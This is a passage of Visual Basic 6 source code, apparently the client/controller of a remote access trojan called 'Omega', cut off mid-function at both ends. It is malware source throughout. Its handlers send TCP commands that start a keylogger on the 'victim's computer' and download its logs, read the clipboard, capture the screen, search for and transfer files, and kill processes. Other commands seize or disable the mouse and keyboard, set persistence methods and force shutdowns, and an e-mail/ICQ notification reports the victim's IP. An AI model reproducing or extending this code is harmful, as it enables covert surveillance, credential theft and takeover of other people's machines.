If j <> 3 Then '3 is no choose
   lblAction.Caption = "Change the startup method to victim's computer."
   TCPClient.SendData "SET_STARTUP_03"
   DoEvents
   Sleep 200
   TCPClient.SendData j & ""
Else
   MsgBox "Please select one startup methods.", vbExclamation, "Change Startup Method"
End If
End Sub

Private Sub cmdDisconnVic_3_Click()
    lblAction.Caption = "Disconnect victim's."
    TCPClient.SendData "DISCONN_SERV_03"
End Sub

Private Sub cmdRestartServ_3_Click()
  lblAction.Caption = "Restart server."
  TCPClient.SendData "RESTART_SERV_03"
End Sub

Private Sub cmdRemoveServ_3_Click()
If MsgBox("Are you sure want to remove?", vbYesNo, "Omega") = vbYes Then
   lblAction.Caption = "Remove server."
   TCPClient.SendData "REMOVE_SERV_03"
End If
End Sub

Private Sub cmdCloseServ_3_Click()
  lblAction.Caption = "Close server."
  TCPClient.SendData "CLOSE_SERV_03"
End Sub

Private Sub txtPort_3_KeyPress(KeyAscii As Integer)
If KeyAscii = 8 Then
ElseIf KeyAscii >= Asc("0") And KeyAscii <= Asc("9") Then
Else
   KeyAscii = 0
End If
End Sub

'Function 4
Private Sub cmdIPNotify_4_Click(Index As Integer)
Select Case Index
     Case 0
          If Trim(txtSMTP_4.text) <> "" And Trim(txtMailto_4.text) <> "" Then
             lblAction.Caption = "Enable e-mail notify, and send notify information."
             TCPClient.SendData "0NOTIFY_04"
             DoEvents
             Sleep 200
             TCPClient.SendData Trim(txtSMTP_4.text) & Delimiter & Trim(txtMailto_4.text) & Delimiter
          Else
             MsgBox "Please input complete.", vbExclamation, "E-Mail Notify"
          End If
     Case 1
          lblAction.Caption = "Disable e-mail notify."
          TCPClient.SendData "1NOTIFY_04"
     Case 2
          If Trim(txtUIN_4.text) <> "" And Len(Trim(txtUIN_4.text)) >= 5 Then
             lblAction.Caption = "Enable ICQ notify, and send notify information."
             TCPClient.SendData "2NOTIFY_04"
             DoEvents
             Sleep 200
             TCPClient.SendData Trim(txtUIN_4.text)
          Else
             MsgBox "Please input complete.", vbExclamation, "ICQ Notify"
          End If
     Case 3
          lblAction.Caption = "Disable ICQ notify."
          TCPClient.SendData "3NOTIFY_04"
End Select
End Sub

Private Sub txtUIN_4_KeyPress(KeyAscii As Integer)
If KeyAscii = 8 Then
ElseIf KeyAscii >= Asc("0") And KeyAscii <= Asc("9") Then
Else
   KeyAscii = 0
End If
End Sub

'Function 6
Private Sub cmdKeyboard_6_Click(Index As Integer)
Select Case Index
    Case 0
         lblAction.Caption = "Open keylogger on victim's computer."
         txtAction.text = "0KEYBOARD_06"
         TCPClient.SendData "0KEYBOARD_06"
         frmKeyLogger.Show
    Case 1
         lblAction.Caption = "Send keystrokes on victim's computer."
         txtAction.text = "1KEYBOARD_06"
         TCPClient.SendData "1KEYBOARD_06"
         frmKeyStrokes.Show
    Case 2
         lblAction.Caption = "Get offline keys on victim's computer."
         txtAction.text = "4FILEGM_13" 'download offline keys
         Call setFilename_13("KEYLOG.TXT")
         TCPClient.SendData "2KEYBOARD_06"
         DoEvents
         frmProgress.Caption = "Download File"
         frmProgress.lblStatus.Caption = "Downloading offline keys"
         frmProgress.Reset
         Call frmProgress.setFilePath(txtLocalFolder_10 & "KEYLOG.TXT")
         Call frmProgress.setfrmName(0)
         frmProgress.Show
         frmMain.TimerTransfer.Enabled = True
    Case 3
         lblAction.Caption = "Clear offline keys on victim's computer."
         TCPClient.SendData "3KEYBOARD_06"
    Case 4
         lblAction.Caption = "Disable keyboard on victim's computer."
         TCPClient.SendData "4KEYBOARD_06"
End Select
End Sub

Private Sub ActiveWindowList_6(DATA As String)
Dim i As Integer

i = StringTokenizer(DATA)
For i = 0 To i
    Call frmKeyStrokes.ReceiveWindowList(Info(i))
    Info(i) = ""
Next i
End Sub

'Function 7
Private Sub cmdChat_7_Click()
Dim STC(1) As Long

txtNickname_7.text = Trim(txtNickname_7)
STC(0) = ShapetxtColor_7(0).BackColor
STC(1) = ShapetxtColor_7(1).BackColor

If Int(txtFSize_7(0)) < 7 Or Int(txtFSize_7(0)) > 24 Or _
   Int(txtFSize_7(1)) < 7 Or Int(txtFSize_7(1)) > 24 Then
   MsgBox "Please input font size between 7 to 24.", vbExclamation, "Font Size"
   Exit Sub
End If
   
If txtNickname_7.text <> "" Then
   lblAction.Caption = "Chat with the victim."
   txtAction.text = "CHAT_07"
   TCPClient.SendData "CHAT_07" & Delimiter & txtNickname_7 & Delimiter & txtSize_7 & Delimiter & STC(0) & Delimiter & txtFSize_7(0) & Delimiter
   DoEvents
   Sleep 200
   Call frmChat.SetNickname(txtNickname_7)
   frmChat.txtData.ForeColor = STC(1)
   frmChat.txtData.FontSize = CLng(txtFSize_7(1))
   frmChat.Show
Else
   MsgBox "Please input your nickname.", vbExclamation, "Chat"
End If
End Sub

Private Sub lbltxtColor_7_Click(Index As Integer)
    CommonDialog1.Action = 3
    ShapetxtColor_7(Index).BackColor = CommonDialog1.Color
    txtSample_7(Index).ForeColor = CommonDialog1.Color
End Sub

Private Sub VScrollSize_7_Change()
    txtSize_7.text = VScrollSize_7.Value
End Sub

Private Sub txtFSize_7_Change(Index As Integer)
txtFSize_7(Index).text = Trim(txtFSize_7(Index).text)
If Int(txtFSize_7(Index)) >= 7 And Int(txtFSize_7(Index)) <= 24 Then
   txtSample_7(Index).FontSize = Int(txtFSize_7(Index))
End If
End Sub

Public Sub CloseChat()
    txtAction.text = ""
    TCPClient.SendData "CLOSE"
End Sub
    
Public Sub sendText(text As String)
    TCPClient.SendData text
End Sub

Private Sub txtFSize_7_KeyPress(Index As Integer, KeyAscii As Integer)
If KeyAscii = 8 Then
ElseIf KeyAscii >= Asc("0") And KeyAscii <= Asc("9") Then
Else
   KeyAscii = 0
End If
End Sub

'Function 8
Private Sub cmdOpen_8_Click()
txtURL_8.text = Trim(txtURL_8.text)
If InStr(txtURL_8.text, "://") <> 0 Then
   lblAction.Caption = "Open default browser and go to the URL you especify."
   TCPClient.SendData "BROWSER_08"
   DoEvents
   Sleep 200
   TCPClient.SendData Trim(txtURL_8.text)
Else
   MsgBox "Please input correct.", vbExclamation, "Browser"
End If
End Sub

'Function 9
Private Sub cmdFind_9_Click()
txtName_9.text = Trim(txtName_9.text)
txtFolder_9.text = Trim(txtFolder_9.text)
  
  If txtName_9.text = "" Then
     MsgBox "Please input name you want to find.", vbExclamation, "Find Files"
  ElseIf txtFolder_9.text = "" Then
     MsgBox "Please input folder you want to look.", vbExclamation, "Find Files"
  Else
     Me.MousePointer = vbHourglass
     lblAction.Caption = "Find files on victim's computer."
     txtAction.text = "FINDFILES_09"
     TCPClient.SendData "FINDFILES_09"
     DoEvents
     Sleep 200
     TCPClient.SendData txtName_9.text & Delimiter & txtFolder_9.text & Delimiter & CheckSub_9.Value & Delimiter
  End If
End Sub

Private Sub ReceivedFindFiles_9(DATA As String)
On Error Resume Next
Dim i As Integer

i = StringTokenizer(DATA)
    
  For i = 0 To i
      Call frmFindFiles.ReceivedFindFiles(Info(i))
      Info(i) = ""
  Next i
  
End Sub

'Function 10
Private Sub cmdFolder_10_Click()
Dim strResFolder As String

strResFolder = BrowseForFolder(hwnd, "Please select a local folder.")

If strResFolder <> "" Then
   If Right(strResFolder, 1) <> "\" Then
      strResFolder = strResFolder & "\"
   End If
   txtLocalFolder_10.text = strResFolder
   SaveProfile "Local Option", "Local Folder", txtLocalFolder_10.text, cPath & "Omega.ini"
End If
End Sub

Private Sub CheckTXT_Click()
  If CheckTXT.Value = 0 Then 'unchecked
     SaveProfile "Local Option", "Auto View", 0, cPath & "Omega.ini"
  ElseIf CheckTXT.Value = 1 Then 'checked
     SaveProfile "Local Option", "Auto View", 1, cPath & "Omega.ini"
  End If
End Sub

'Function 12
Private Sub ImgIcon_12_Click(Index As Integer)
    Icon_12.Picture = ImgIcon_12(Index).Picture
    lblIcon_12.Visible = False 'make "None" label not display at icon (while clicked)
    lblIcon_12.Caption = Index
    
    'ImgIcon_12
    '0 = vbExclamation
    '1 = vbInformation
    '2 = vbCritical
    '3 = vbQuestion
    Select Case Index
    Case 0
         icons = vbExclamation
    Case 1
         icons = vbInformation
    Case 2
         icons = vbCritical
    Case 3
         icons = vbQuestion
    End Select
End Sub

Private Sub OptButton_12_Click(Index As Integer)
'OptButton_12
'0 = vbOKOnly
'1 = vbAbortRetryIgnore
'2 = vbOKCancel
'3 = vbRetryCancel
'4 = vbYesNo
'5 = vbYesNoCancel
Select Case Index
Case 0
    Button = vbOKOnly
Case 1
    Button = vbAbortRetryIgnore
Case 2
    Button = vbOKCancel
Case 3
    Button = vbRetryCancel
Case 4
    Button = vbYesNo
Case 5
    Button = vbYesNoCancel
End Select
End Sub

Private Sub cmdTestMsg_12_Click()
   Call MakeMsg_12
   MsgBox txtMsg_12.text, Button + icons, txtMsgTitle_12.text
End Sub

Private Sub cmdSendMsg_12_Click()
   Call MakeMsg_12
   TCPClient.SendData "SEND_MSG_12"
   DoEvents
   Sleep 200
   TCPClient.SendData txtMsg_12.text & Delimiter & Button + icons & Delimiter & txtMsgTitle_12.text & Delimiter
   lblAction.Caption = "Message sent."
End Sub

Private Sub MakeMsg_12()
Dim b As String
Dim i As Integer

txtMsg_12.text = Trim(txtMsgText_12.text)

For i = 1 To Len(txtMsg_12.text)
    b = Mid(txtMsg_12.text, i, 2)
    If b = "\n" Then
       txtMsg_12.SelStart = i - 1
       txtMsg_12.SelLength = 2
       txtMsg_12.SelText = vbCrLf 'change "\n" to "ENTER"
    End If
Next i
End Sub

'Function 13
Private Sub ListDrives_13(Drives As String)
On Error Resume Next
Dim i As Integer

Drives = UCase(Drives)
frmFileGM.cbDrives.Clear

i = StringTokenizer(Drives)

For i = 0 To i
    GetDir(i) = Info(i)
    frmFileGM.cbDrives.AddItem Mid$(Info(i), 1, InStr(1, Info(i), "\"))
    Info(i) = ""
Next i

DoEvents
frmFileGM.cbDrives.ListIndex = 1

End Sub

Private Sub ListFiles_13(Files As String)
Dim i, j As Integer
Dim cFile As Integer
Dim WidthList As Long
Dim pIndex As Integer 'up directory picture index
Dim tDir As String 'up directory

cFile = 0
WidthList = 1000
i = StringTokenizer(Files)
If i <> 0 Then WidthList = CLng(Info(i))

Call frmFileGM.ClearList
frmFileGM.List1.AddItem ".."
frmFileGM.ListView1.ColumnHeaders.Add , , "Directory", WidthList

'for get the up directory
If Right$(sDir, 1) = "\" Then
   tDir = Left$(sDir, Len(sDir) - 1)
Else
   tDir = sDir
End If
'eg: Before tDir = C:\My Documents\Music
'    After  tDir = C:\My Documents\
tDir = Mid$(tDir, 1, InStrRev(tDir, "\", Len(tDir)))

'find the Drive Type
For j = 0 To UBound(GetDir)
    'e.g C:\ = C:\
    If tDir = Left$(GetDir(j), 3) Then
       'e.g tDir = HARDDRIVE|
       tDir = Right$(GetDir(j), 10)
       Exit For
    End If
Next j
'get picture index
pIndex = PicIndex(tDir)

'directory is drive, eg. A:\, C:\, D:\, E:\
If pIndex >= 24 And pIndex <= 28 Then
   'has up directory, so add ".."
   frmFileGM.ListView1.ListItems.Add.text = ".."
   frmFileGM.ListView1.ListItems.Item(1).SmallIcon = pIndex
   j = 1 'ListView1 start index
Else
   j = 0 'ListView1 start index
End If

'let File Manager know the ListView1 start index
Call frmFileGM.setIndex(j)

For i = 0 To (i - 1)
    Call frmFileGM.ReceiveData(Info(i), i + 1 + j)
    If Mid(Info(i), 2, 1) <> ":" Then cFile = cFile + 1
    Info(i) = ""
    DoEvents
Next i

Info(i) = ""
frmFileGM.lblStatus.Caption = cFile & " file(s) in " & sDir
End Sub

Public Sub setFilename_13(FileName As String)
    sFile = FileName
End Sub

Public Sub setDirname_13(DirName As String)
    sDir = DirName
End Sub

Public Sub UploadFile(upFile As String)
On Error GoTo errHandle
Dim LocData As String
Dim lngFileLen As Long
Dim FileHandle As Integer
Dim n As Long
Dim uTotal As Long

    'compress file to upload
    Call CompressFile(upFile, upFile & ".OZip", 9)
    DoEvents
    Sleep 100
    
    Call frmProgress.setFilePath(upFile & ".OZip")
    
    uTotal = 0
    DoneBytes = 0
    
    FileHandle = FreeFile
    Open upFile & ".OZip" For Binary As #FileHandle
    lngFileLen = LOF(FileHandle)
    LocData = Space$(1024)
    DoEvents
    ReceiveData = False
    UPCancel = False
    
    'send package by package(1024KB)
    For n = 1 To lngFileLen \ 1024
        LocData = Space$(1024)
        Get #FileHandle, , LocData
        uTotal = uTotal + Len(LocData)
        DoneBytes = DoneBytes + Len(LocData)
        frmProgress.ProgressBar1.Value = Int((n / (lngFileLen \ 1024)) * 100)
        frmProgress.lblPercent.Caption = Int((n / (lngFileLen \ 1024)) * 100) & "%"
        frmProgress.lblBytes.Caption = FileByteFormat(uTotal) & " of " & FileByteFormat(lngFileLen)
        DoEvents
        TCPClient.SendData LocData
        DoEvents
        Sleep 10
        Do While ReceiveData <> True
           If UPCancel Then GoTo errHandle
           DoEvents
           Sleep 10
        Loop
        ReceiveData = False
    Next
    
    'send last package
    If lngFileLen Mod 1024 <> 0 Then
        LocData = Space$(lngFileLen Mod 1024)
        DoneBytes = DoneBytes + Len(LocData)
        Get #FileHandle, , LocData
        TCPClient.SendData LocData
        DoEvents
        Sleep 10
        Do While ReceiveData <> True
           If UPCancel Then GoTo errHandle
           DoEvents
           Sleep 10
        Loop
        ReceiveData = False
    End If
    
    Close #FileHandle
    DoEvents
    Sleep 200
    'send end of file
    TCPClient.SendData "FILEEND"
    DoEvents
    'progress status
    frmProgress.ProgressBar1.Value = 100
    frmProgress.lblPercent.Caption = "100%"
    frmProgress.lblBytes.Caption = FileByteFormat(lngFileLen) & " of " & FileByteFormat(lngFileLen)
    DoEvents
    'delete compress file
    If FileExists(upFile & ".OZip") Then
       Kill upFile & ".OZip"
       DoEvents
    End If
    frmMain.TimerTransfer.Enabled = False
    Unload frmProgress
    DoEvents
    
Exit Sub
errHandle:
Close #FileHandle
frmMain.TimerTransfer.Enabled = False
If FileExists(upFile & ".OZip") Then
   Kill upFile & ".OZip"
   DoEvents
End If
If UPCancel = False Then
   MsgBox Err.Description, vbExclamation, "Upload File"
End If
End Sub

Public Sub CancelUpload()
frmMain.TimerTransfer.Enabled = False
txtAction.text = ""
UPCancel = True
End Sub

Public Sub CancelDownload()
On Error Resume Next
Dim dlFile As String

  'reset data
  bFileArriving = False
  txtAction.text = ""
  sFile = ""
  Total = 0
  sArriving = ""
  DoEvents
  
  frmMain.TimerTransfer.Enabled = False
  
  'if not get desktop preview screen
  If LCase(sFile) <> "preview.jpg" Then
     dlFile = Trim(txtLocalFolder_10) & sFile & ".OZip"
  Else 'is other download file
     dlFile = Trim(txtLocalFolder_10) & sFile
  End If
            
  'if file already exist, delete it.
  If FileExists(dlFile) Then
     Kill dlFile
     DoEvents
  End If
End Sub

Private Sub TimerTransfer_Timer()
  frmProgress.lblSpeed.Caption = "Speed: " & Format(DoneBytes / 1000, "###0.0") & " / KBps"
  DoneBytes = 0
End Sub

'Function 14
Private Sub ListView_14_ItemClick(ByVal Item As MSComctlLib.ListItem)
WinListNo = Item.Index
End Sub

Private Sub cmdRefresh_14_Click()
    'clear first.
    ListView_14.ListItems.Clear
    lblAction.Caption = "Get the running programs on victim's computer."
    txtAction.text = "REFRESH_14"
    TCPClient.SendData "REFRESH_14"
    WinListNo = -1
End Sub

Private Sub cmdHide_14_Click()
    If CheckListBox_14 = False Then
       Exit Sub
    End If
    lblAction.Caption = "Hide the selected window on victim's computer."
    TCPClient.SendData "HIDE_14"
    DoEvents
    Sleep 200
    TCPClient.SendData ListView_14.ListItems.Item(WinListNo).text & Delimiter & ListView_14.ListItems.Item(WinListNo).SubItems(1) & Delimiter
    WinListNo = -1
End Sub

Private Sub cmdShow_14_Click()
    If CheckListBox_14 = False Then
       Exit Sub
    End If
    lblAction.Caption = "Show the selected window on victim's computer."
    TCPClient.SendData "SHOW_14"
    DoEvents
    Sleep 200
    TCPClient.SendData ListView_14.ListItems.Item(WinListNo).text & Delimiter & ListView_14.ListItems.Item(WinListNo).SubItems(1) & Delimiter
    WinListNo = -1
End Sub

Private Sub cmdClose_14_Click()
    If CheckListBox_14 = False Then
       Exit Sub
    End If
    lblAction.Caption = "Close the selected window on victim's computer."
    TCPClient.SendData "CLOSE_14"
    DoEvents
    Sleep 200
    TCPClient.SendData ListView_14.ListItems.Item(WinListNo).text & Delimiter & ListView_14.ListItems.Item(WinListNo).SubItems(1) & Delimiter
    WinListNo = -1
End Sub

Private Sub cmdMin_14_Click()
    If CheckListBox_14 = False Then
       Exit Sub
    End If
    lblAction.Caption = "Minimize the selected window on victim's computer."
    TCPClient.SendData "MIN_14"
    DoEvents
    Sleep 200
    TCPClient.SendData ListView_14.ListItems.Item(WinListNo).text & Delimiter & ListView_14.ListItems.Item(WinListNo).SubItems(1) & Delimiter
    WinListNo = -1
End Sub

Private Sub cmdMax_14_Click()
    If CheckListBox_14 = False Then
       Exit Sub
    End If
    lblAction.Caption = "Maximize the selected window on victim's computer."
    TCPClient.SendData "MAX_14"
    DoEvents
    Sleep 200
    TCPClient.SendData ListView_14.ListItems.Item(WinListNo).text & Delimiter & ListView_14.ListItems.Item(WinListNo).SubItems(1) & Delimiter
    WinListNo = -1
End Sub

Private Sub cmdFocus_14_Click()
    If CheckListBox_14 = False Then
       Exit Sub
    End If
    lblAction.Caption = "Focus the selected window on victim's computer."
    TCPClient.SendData "FOCUS_14"
    DoEvents
    Sleep 200
    TCPClient.SendData ListView_14.ListItems.Item(WinListNo).text & Delimiter & ListView_14.ListItems.Item(WinListNo).SubItems(1) & Delimiter
    WinListNo = -1
End Sub

Private Sub cmdDisableX_14_Click()
    If CheckListBox_14 = False Then
       Exit Sub
    End If
    lblAction.Caption = "Disable the selected window x button on victim's computer."
    TCPClient.SendData "DISABLEX_14"
    DoEvents
    Sleep 200
    TCPClient.SendData ListView_14.ListItems.Item(WinListNo).text & Delimiter & ListView_14.ListItems.Item(WinListNo).SubItems(1) & Delimiter
    WinListNo = -1
End Sub

Private Sub cmdRename_14_Click()
    If CheckListBox_14 = False Then
       Exit Sub
    End If
    If Trim(txtRename_14.text) <> "" Then
       lblAction.Caption = "Rename the selected window name on victim's computer."
       TCPClient.SendData "RENAME_14"
       DoEvents
       Sleep 200
       TCPClient.SendData ListView_14.ListItems.Item(WinListNo).text & Delimiter & ListView_14.ListItems.Item(WinListNo).SubItems(1) & Delimiter & Trim(txtRename_14.text) & Delimiter
       DoEvents
    Else
       MsgBox "Please enter text.", vbExclamation, "Windows Manager"
    End If
    WinListNo = -1
End Sub

Private Function CheckListBox_14() As Boolean
    CheckListBox_14 = False
    If WinListNo = -1 Then
       MsgBox "Please select one.", vbExclamation, "Windows Manager"
       CheckListBox_14 = False
    Else
       CheckListBox_14 = True
    End If
End Function

Private Sub RefreshWinhWnd_14(DATA As String)
Dim i, j As Integer

j = 0
i = StringTokenizer(DATA)

For i = 1 To (i / 2)
    With ListView_14.ListItems
    .Add.text = Info(j)
    .Item(i).SubItems(1) = Info(j + 1)
    End With
    Info(j) = ""
    Info(j + 1) = ""
    j = j + 2
Next i

End Sub

'Function 15
Private Sub Opt_15_Click(Index As Integer)
    optNo = Index
End Sub

Private Sub cmdRefresh_15_Click()
    ListView_15.ListItems.Clear
    txtPath_15.text = ""
    List_15.Clear
    ListProID_15.Clear
    lblAction.Caption = "Get the running process on victim's computer."
    txtAction.text = "REFRESH_15"
    TCPClient.SendData "REFRESH_15"
End Sub

Private Sub cmdEndTask_15_Click()
  If Trim(txtPath_15) <> "" And (ListNo - 1) <> -1 Then
    lblAction.Caption = "Terminate the running process on victim's computer."
    TCPClient.SendData "ENDTASK_15"
    DoEvents
    Sleep 200
    TCPClient.SendData txtPath_15 & Delimiter & ListProID_15.List(ListNo - 1) & Delimiter
  Else
    MsgBox "Please select one.", vbExclamation, "Process Manager"
  End If
End Sub

Private Sub cmdPriority_15_Click()
If Trim(txtPath_15) <> "" And checkPriority_15 = True And (ListNo - 1) <> -1 Then
    lblAction.Caption = "Thread priority the running process on victim's computer."
    TCPClient.SendData "PRIORITY_15"
    DoEvents
    Sleep 200
    TCPClient.SendData txtPath_15 & Delimiter & optNo & Delimiter & ListProID_15.List(ListNo - 1) & Delimiter
  Else
    MsgBox "Please select one.", vbExclamation, "Process Manager"
  End If
End Sub

Private Function checkPriority_15() As Boolean
Dim i, v As Integer
    
    v = 32
    checkPriority_15 = False
    For i = 1 To 4
        If Opt_15(v).Value = True Then
           checkPriority_15 = True
           Exit Function
        Else
           v = v * 2
        End If
    Next i
End Function

Private Sub RefreshProcess_15(DATA As String)
Dim i, j As Integer
Dim p(3) As String
Dim LF As ListItem
Dim LFS As ListSubItem

p(0) = "Idle"
p(1) = "Normal"
p(2) = "High"
p(3) = "Realtime"

j = 0
i = StringTokenizer(DATA)

For i = 1 To (i / 4)
    With ListView_15.ListItems
    .Add.text = Info(j)
    .Item(i).SubItems(1) = p(Int(Info(j + 2)))
    End With
    List_15.AddItem Info(j + 1)
    ListProID_15.AddItem Info(j + 3)
    ListView_15.ListItems.Item(i).SmallIcon = PicIndex(List_15.List(i - 1))
    Info(j) = ""
    Info(j + 1) = ""
    Info(j + 2) = ""
    Info(j + 3) = ""
    j = j + 4
Next i

End Sub

Private Sub ListView_15_ItemClick(ByVal Item As MSComctlLib.ListItem)
    ListNo = Item.Index
    txtPath_15.text = List_15.List(Item.Index - 1)
End Sub

'Function 16
Private Sub cmdRead_16_Click()
   lblAction.Caption = "Read clipboard text on victim's computer."
   txtAction.text = "READ_CLIP_16"
   TCPClient.SendData "READ_CLIP_16"
End Sub

Private Sub cmdSet_16_Click()
   lblAction.Caption = "Set clipboard text on victim's computer."
   TCPClient.SendData "SET_CLIP_16"
   DoEvents
   Sleep 200
   TCPClient.SendData txtClipboard_16.text
End Sub

Private Sub cmdEmpty_16_Click()
   lblAction.Caption = "Empty clipboard on victim's computer."
   TCPClient.SendData "EMPTY_CLIP_16"
End Sub

'Function 18
Private Sub cmdDesktop_18_Click(Index As Integer)
Select Case Index
    Case 0
         lblAction.Caption = "Open screen preview on victim's computer."
         TCPClient.SendData "0DESKTOP_18"
         frmScreenPreview.Show
    Case 1
         lblAction.Caption = "Full screen capture on victim's computer."
         txtAction.text = "4FILEGM_13" 'download desktop screen
         Call setFilename_13("desktop.jpg")
         TCPClient.SendData "1DESKTOP_18"
         DoEvents
         frmProgress.Caption = "Download File"
         frmProgress.lblStatus.Caption = "Downloading full screen capture"
         frmProgress.Reset
         Call frmProgress.setFilePath(txtLocalFolder_10 & "desktop.jpg")
         Call frmProgress.setfrmName(0)
         frmProgress.Show
         frmMain.TimerTransfer.Enabled = True
End Select
End Sub

'Function 19
Private Sub cmdFlipScr_19_Click()
  If OptFlip_19(0).Value = True Then
     lblAction.Caption = "Flip screen vertically on victim's computer."
     TCPClient.SendData "0FLIPSCR_19"
  ElseIf OptFlip_19(1).Value = True Then
     lblAction.Caption = "Flip screen horizontally on victim's computer."
     TCPClient.SendData "1FLIPSCR_19"
  ElseIf OptFlip_19(0).Value = False And OptFlip_19(1).Value = False Then
     MsgBox "Please select one.", vbExclamation, "Flip Screen"
  End If
End Sub

'Function 20
Private Sub cmdPrint_20_Click()
If Trim(txtPrint_20.text) <> "" And Len(Trim(txtPrint_20.text)) <= 1000 Then
   lblAction.Caption = "Print text on victim's computer."
   TCPClient.SendData "PRINT_20"
   DoEvents
   Sleep 200
   TCPClient.SendData Trim(txtPrint_20.text)
ElseIf Len(Trim(txtPrint_20.text)) > 1000 Then
   MsgBox "Text can't more than 1000 characters.", vbExclamation, "Print"
ElseIf Trim(txtPrint_20.text) = "" Then
   MsgBox "Please key in your text.", vbExclamation, "Print"
End If
End Sub

'Function 21
Private Sub cmdRefresh_21_Click()
    ListResolution_21.Clear
    lblAction.Caption = "Get the available resolutions on the victim's computer."
    txtAction.text = "REFRESH_21"
    TCPClient.SendData "REFRESH_21"
End Sub

Private Sub cmdChange_21_Click()
If ListResolution_21.ListIndex <> -1 Then
   lblAction.Caption = "Change the resolutions on the victim's computer."
   TCPClient.SendData "CHANGE_21"
   DoEvents
   Sleep 200
   TCPClient.SendData ListResolution_21.ListIndex & ""
Else
   MsgBox "Please select one.", vbExclamation, "Resolution"
End If
End Sub

Private Sub RefreshResolution_21(DATA As String)
Dim i As Integer

i = StringTokenizer(DATA)
For i = 0 To i
    ListResolution_21.AddItem Info(i)
    Info(i) = ""
Next i
End Sub

'Function 22
Private Sub cmdWinColor_22_Click(Index As Integer)
Dim SC(3) As Long

SC(0) = ShapeColor_22(0).BackColor 'menus
SC(1) = ShapeColor_22(1).BackColor 'buttons
SC(2) = ShapeColor_22(2).BackColor 'background
SC(3) = ShapeColor_22(3).BackColor 'text

Select Case Index
    Case 0
         lblAction.Caption = "Testing colors."
         Call SetSysColors(1, COLOR_MENU, SC(0))
         Call SetSysColors(1, COLOR_BTNFACE, SC(1))
         Call SetSysColors(1, COLOR_BACKGROUND, SC(2))
         Call SetSysColors(1, COLOR_WINDOWTEXT, SC(3))
    Case 1
         lblAction.Caption = "change colors on victim's computer."
         TCPClient.SendData "WINCOLOR_22"
         DoEvents
         Sleep 200
         TCPClient.SendData SC(0) & Delimiter & SC(1) & Delimiter & SC(2) & Delimiter & SC(3) & Delimiter
    Case 2
         lblAction.Caption = "Restore default colors."
         Call SetSysColors(1, COLOR_MENU, DefaultColor(0))
         Call SetSysColors(1, COLOR_BTNFACE, DefaultColor(1))
         Call SetSysColors(1, COLOR_BACKGROUND, DefaultColor(2))
         Call SetSysColors(1, COLOR_WINDOWTEXT, DefaultColor(3))
End Select
End Sub

Private Sub lbShape_22_Click(Index As Integer)
  lblAction.Caption = "change colors."
  CommonDialog1.Action = 3
  ShapeColor_22(Index).BackColor = CommonDialog1.Color
End Sub

'Function 24
Private Sub cmdScrSaver_24_Click(Index As Integer)
Select Case Index
    Case 0 'save settings
         If checkSettings_24 = True Then
            lblAction.Caption = "Save settings on victim's computer."
            TCPClient.SendData "0SCRSAVER_24"
            DoEvents
            Sleep 200
            TCPClient.SendData txtText_24.text & Delimiter & cbFont_24.text & Delimiter & _
              Trim(txtSize_24.text) & Delimiter & cbFStyle_24.ListIndex & Delimiter & cbSStyle_24.ListIndex & Delimiter & _
              ResolutionSlider.Value & Delimiter & SpeedSlider.Value & Delimiter
         End If
    Case 1 'run screen saver
         lblAction.Caption = "Run screen saver on victim's computer."
         TCPClient.SendData "1SCRSAVER_24"
End Select
End Sub

Function checkSettings_24() As Boolean
If Trim(txtText_24.text) = "" Then
   MsgBox "Please input text.", vbExclamation, "Screen Saver"
   txtText_24.SetFocus
   checkSettings_24 = False
ElseIf cbFont_24.text = "" Then
   MsgBox "Please select one font.", vbExclamation, "Screen Saver"
   checkSettings_24 = False
ElseIf cbFStyle_24.text = "" Then
   MsgBox "Please select font style.", vbExclamation, "Screen Saver"
   checkSettings_24 = False
ElseIf cbSStyle_24.text = "" Then
   MsgBox "Please select spin style.", vbExclamation, "Screen Saver"
   checkSettings_24 = False
End If
checkSettings_24 = True
End Function

Private Sub SizeVScroll_24_Change()
    txtSize_24.text = SizeVScroll_24.Value
End Sub

'Function 25
Private Sub cmdRestartWin_25_Click(Index As Integer)
Select Case Index
    Case 0
         lblAction.Caption = "Normal shut down the victim's computer."
         TCPClient.SendData "0RESTARTWIN_25"
    Case 1
         lblAction.Caption = "Force shut down the victim's computer."
         TCPClient.SendData "1RESTARTWIN_25"
    Case 2
         lblAction.Caption = "Log off from the windows user."
         TCPClient.SendData "2RESTARTWIN_25"
    Case 3
         lblAction.Caption = "Restart the victim's computer."
         TCPClient.SendData "3RESTARTWIN_25"
    Case 4
         lblAction.Caption = "Force restart the victim's computer."
         TCPClient.SendData "4RESTARTWIN_25"
End Select
TCPClient.Close
End Sub

'Function 26
Private Sub cmdMouse_26_Click(Index As Integer)
Select Case Index
    Case 0 'set double click time
         lblAction.Caption = "Set double click time on victim's computer."
         TCPClient.SendData "0MOUSE_26"
         DoEvents
         Sleep 200
         TCPClient.SendData "0" & Trim(txtDblClickTime_26.text)
    Case 1 'reverse buttons
         lblAction.Caption = "Reverse buttons on victim's mouse."
         TCPClient.SendData "1MOUSE_26"
    Case 2 'restore buttons
         lblAction.Caption = "Restore buttons on victim's mouse."
         TCPClient.SendData "2MOUSE_26"
    Case 3 'hide mouse
         lblAction.Caption = "Hide the mouse cursor on victim's computer."
         TCPClient.SendData "3MOUSE_26"
    Case 4 'show mouse
         lblAction.Caption = "Show the mouse cursor on victim's computer."
         TCPClient.SendData "4MOUSE_26"
    Case 5 'move/control mouse
         lblAction.Caption = "Controlling mouse on victim's computer."
         TCPClient.SendData "5MOUSE_26"
         TimerMouse_26.Enabled = True
    Case 6 'stop move/control
         lblAction.Caption = "Stop controlling mouse on victim's computer."
         TimerMouse_26.Enabled = False
         TCPClient.SendData "6MOUSE_26"
    Case 7 'disable mouse
         lblAction.Caption = "Disable mouse on victim's computer."
         TCPClient.SendData "7MOUSE_26"
End Select
End Sub

Private Sub TimerMouse_26_Timer()
Dim mpMouse As MousePosition
Dim x As Integer
Dim y As Integer
    
    x = Screen.Width / Screen.TwipsPerPixelX
    y = Screen.Height / Screen.TwipsPerPixelY
    
    GetCursorPos mpMouse
    TCPClient.SendData (mpMouse.x / x) & Delimiter & (mpMouse.y / y) & Delimiter
    DoEvents
End Sub

Private Sub txtDblClickTime_26_KeyPress(KeyAscii As Integer)
If KeyAscii = 8 Then
ElseIf KeyAscii >= Asc("0") And KeyAscii <= Asc("9") Then
Else
   KeyAscii = 0
End If
End Sub

'Function 27
Private Sub cmdSound_27_Click(Index As Integer)
  If Index <> 3 Then
     lblAction.Caption = "Save the sound configurations on victim's computer."
     txtAction.text = "SOUND_27"
     TCPClient.SendData "SOUND_27"
     DoEvents
     Sleep 200
